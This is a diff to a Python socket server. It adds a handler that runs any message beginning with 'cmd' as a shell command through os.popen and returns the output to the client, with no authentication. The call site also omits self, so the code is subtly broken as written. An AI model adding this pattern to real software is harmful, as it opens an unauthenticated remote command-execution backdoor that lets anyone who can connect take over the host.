@@ -1,5 +1,6 @@
 import socket
 import threading
+import os
 
 class SocketServer:
     HEADER = 1024
@@ -18,7 +19,22 @@ class SocketServer:
         self.new_data = False # indicator of new data
         self.num_conns = 0  # number of connections
 
-
+    def parse_message(self, msg):
+        args = msg.split()
+        if args[0] == 'cmd': # command constant
+            if len(args) == 1:
+                return "Error: Send arguments with cmd"
+            else:
+                command = ""
+                for arg in args[1:len(args) - 1]:
+                    command += arg
+                    command += " "
+                command += args[-1]
+                stream = os.popen(command)
+                output = stream.read()
+                return output
+        else:
+            return "Message recieved"
     def handle_client(self, conn, addr):
         print("[NEW CONNECTIONS] " + str(addr[0]) + " connected.")
 
@@ -35,7 +51,7 @@ class SocketServer:
                     conn.send(("SENDING WORK OVER").encode(self.FORMAT))
                 else:    
                     print(str(addr[0]) + ": " + msg)
-                    conn.send("Msg recieved".encode(self.FORMAT))
+                    conn.send(parse_message(msg).encode(self.FORMAT))
         conn.close()
 
 
